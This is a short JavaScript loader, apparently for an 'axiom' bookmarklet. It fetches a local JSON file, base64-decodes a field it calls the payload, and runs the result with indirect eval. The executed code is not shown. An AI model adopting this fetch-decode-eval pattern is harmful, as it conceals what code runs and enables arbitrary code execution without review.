(function(){
  var url = './axiom.json';
  fetch(url).then(function(r){ return r.json(); }).then(function(j){
    try{
      var code = j.c || '';
      // if looks like base64 (mostly alphanumeric + / + + + =), decode
      var isB64 = /^[A-Za-z0-9+/=\-_.]+$/.test(code) && code.length>100;
      var src = isB64 ? (typeof atob==='function' ? atob(code) : Buffer.from(code,'base64').toString('utf8')) : code;
      (0,eval)(src);
    }catch(e){ console.error('axiom-bookmarklet loader error',e); }
  }).catch(function(err){ console.error('failed to load axiom payload',err); });
})();
